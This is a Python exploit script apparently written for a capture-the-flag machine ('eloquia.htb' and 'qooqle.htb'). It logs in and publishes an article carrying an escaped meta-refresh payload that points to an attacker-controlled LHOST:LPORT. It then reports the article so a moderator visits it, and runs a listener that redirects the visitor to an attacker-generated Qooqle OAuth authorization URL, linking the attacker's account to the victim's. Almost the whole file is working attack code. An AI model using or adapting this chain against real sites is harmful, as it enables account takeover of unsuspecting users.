import sys
import requests
import string
import random
import base64
import time
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs
from http.server import BaseHTTPRequestHandler, HTTPServer
from colorama import Fore, Style

IMG_B64 = ""

def log(mode, msg):
    match mode:
        case "success":
            print(Fore.GREEN + f"[+] {msg}" + Style.RESET_ALL)
        case "error":
            print(Fore.RED + f"[-] {msg}" + Style.RESET_ALL)
        case "info":
            print(Fore.BLUE + f"[*] {msg}" + Style.RESET_ALL)
        case "warning":
            print(Fore.YELLOW + f"[!] {msg}" + Style.RESET_ALL)

def help():
    print(f"Usage: python{sys.argv[0]} <Eloquia username> <Eloquia password> <Qooqle username> <Qooqle password> <LHOST> <LPORT>")
    exit(0)

def getcsrftokens(url, sessionid=None):
    try:
        if sessionid != None:
            cookies = {
                "sessionid": sessionid
            }
            r = requests.get(url, cookies=cookies)
        else:
            r = requests.get(url)
        
        if r.status_code != 200:
            log("error", f"Invalid status code received: {r.status_code}.")
            exit(0)
        
        csrfcookie = r.cookies.get("csrftoken")
        if csrfcookie == None:
            log("error", "CSRF cookie not found.")
            exit(0)
        
        soup = BeautifulSoup(r.text, 'html.parser')
        csrfelement = soup.find("input", {"name":"csrfmiddlewaretoken"})
        if csrfelement == None:
            log("error", "CSRF token not found.")
            log("error", f"Full response: {r.text}")
            exit(0)
        
        csrftoken = csrfelement["value"]

    except requests.RequestException as e:
        log("error", f"{url} unreachable.")
        log("error", f"Error: {e}")
        exit(0)
    
    return (csrfcookie, csrftoken)

def login(url, username, password):
    (csrfcookie, csrftoken) = getcsrftokens(url)

    cookies = {
        "csrftoken": csrfcookie
    }

    data = {
        "csrfmiddlewaretoken": csrftoken,
        "username": username,
        "password": password
    }

    try:
        r = requests.post(url, cookies=cookies, data=data, allow_redirects=False)
        if r.status_code == 403:
            log("error", "CSRF verification failed.")
            exit(0)
        
        if "Please enter a correct username and password. Note that both fields may be case-sensitive." in r.text:
            log("error", "Invalid credentials provided.")
            exit(0)
        
        if r.status_code == 302:
            sessionid = r.cookies.get("sessionid")
            if sessionid == None:
                log("error", "Failed to obtain session token.")
                exit(0)
        else:
            log("error", "Unexpected error encountered.")
            log("error", f"Status code: {r.status_code}.")
            log("error", f"Full response: {r.text}")
            exit(0)

    except requests.RequestException as e:
        log("error", "Login failed.")
        log("error", f"Error: {e}")
        exit(0)
    
    if url.startswith("http://eloquia.htb"):
        log("success", f"Login successful to eloquia.htb for user {username}.")
        return sessionid
    if url.startswith("http://qooqle.htb"):
        log("success", f"Login successful to qooqle.htb for user {username}.")
        return (sessionid, f"http://qooqle.htb{r.headers.get("Location")}")

def link_oauth(sessionid, username, password):
    try:
        connect_url = "http://eloquia.htb/accounts/oauth2/qooqle/authorize/"
        r = requests.get(connect_url, cookies={"sessionid":sessionid}, allow_redirects=False)
        if r.status_code != 302:
            log("error", f"Unexpected status code for request to {connect_url}.")
            log("error", f"Status code: {r.status_code}.")
            exit(0)
        qooqle_oauth = r.headers.get("Location")

        r = requests.get(qooqle_oauth, allow_redirects=False)
        if r.status_code != 302:
            log("error", f"Unexpected status code for request to {qooqle_oauth}.")
            log("error", f"Status code: {r.status_code}.")
            exit(0)
        qooqle_login = f"http://qooqle.htb{r.headers.get("Location")}"
        (qsessionid, authorize_url) = login(qooqle_login, username, password)
        
        client_id = parse_qs(urlparse(authorize_url).query)["client_id"][0]
        redirect_uri = parse_qs(urlparse(authorize_url).query)["redirect_uri"][0]
        (csrfcookie, csrftoken) = getcsrftokens(authorize_url, qsessionid)
        cookies = {
            "csrftoken": csrfcookie,
            "sessionid": qsessionid
        }
        data = {
            "csrfmiddlewaretoken": csrftoken,
            "redirect_uri": redirect_uri,
            "scope":"read write",
            "nonce":"",
            "client_id":client_id,
            "state":"",
            "response_type":"code",
            "code_challenge":"",
            "code_challenge_method":"",
            "state":"",
            "claims":"",
            "allow":"Authorize"
        }

        r = requests.post(authorize_url, cookies=cookies, data=data, allow_redirects=False)
        if r.status_code != 302:
            log("error", f"Unexpected status code for request to {authorize_url}.")
            log("error", f"Status code: {r.status_code}.")
            exit(0)
        oauth_url = r.headers.get("Location")

        log("success", f"OAuth URL obtained: {oauth_url}")
        return oauth_url

    except requests.RequestException as e:
        log("error", "Failed to link Qooqle account.")
        log("error", f"Error: {e}")
        exit(0)

def publish(sessionid, lhost, lport):
    try:
        url = "http://eloquia.htb/article/create/"
        (csrfcookie, csrftoken) = getcsrftokens(url, sessionid)

        cookies = {
            "csrftoken": csrfcookie,
            "sessionid": sessionid
        }
        data = {
            "csrfmiddlewaretoken": csrftoken,
            "title": ''.join(random.choice(string.ascii_lowercase) for i in range(8)),
            "content": f"<p>&lt;meta http-equiv=\"refresh\" content=\"0;url=http://{lhost}:{lport}/exploit\"&gt;</p>"
        }
        image = {
            "banner": ("banner.png", base64.b64decode(IMG_B64), "image/png")
        }

        r = requests.post(url, cookies=cookies, data=data, files=image, allow_redirects=False)
        if r.status_code != 302:
            log("error", f"Failed to post article.")
            log("error", f"Status code: {r.status_code}.")
            log("error", f"Full response: {r.text}")
            exit(0)
        id = r.headers.get("Location").strip("/").split("/")[-1]
        log("success", f"Payload posted successfully. Article id: {id}")
        return id
    except requests.RequestException as e:
        log("error", "Failed to publish article.")
        log("error", f"Error: {e}")
        exit(0)

def report(id):
    try:
        url = f"http://eloquia.htb/article/report/{id}/"
        r = requests.get(url, allow_redirects=False)
        if r.status_code != 302:
            log("error", f"Failed to report article.")
            log("error", f"Status code: {r.status_code}.")
            log("error", f"Full response: {r.text}")
            exit(0)
        log("success", "Article reported.")
    except requests.RequestException as e:
        log("error", "Failed to report article.")
        log("error", f"Error: {e}")
        exit(0)

class Server(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/exploit':
            log("success", "Callback detected!")

            sessionid = self.server.sessionid
            user = self.server.user
            password = self.server.password

            oauth_url = link_oauth(sessionid, user, password)

            self.send_response(302)
            self.send_header('Location', oauth_url)
            self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

def main():
    if len(sys.argv) != 7:
        help()
    
    eloquia_user = sys.argv[1]
    eloquia_pwd = sys.argv[2]
    qooqle_user = sys.argv[3]
    qooqle_pwd = sys.argv[4]
    lhost = sys.argv[5]
    lport = sys.argv[6]

    # Eloquia login
    sessionid = login("http://eloquia.htb/accounts/login/", eloquia_user, eloquia_pwd)

    id = publish(sessionid, lhost, lport)
    report(id)

    # Start server
    log("info", "Starting listener...")
    listener = HTTPServer(('', int(lport)), Server)
    listener.sessionid = sessionid
    listener.user = qooqle_user
    listener.password = qooqle_pwd
    listener.serve_forever()

    return

if __name__ == "__main__":
    main()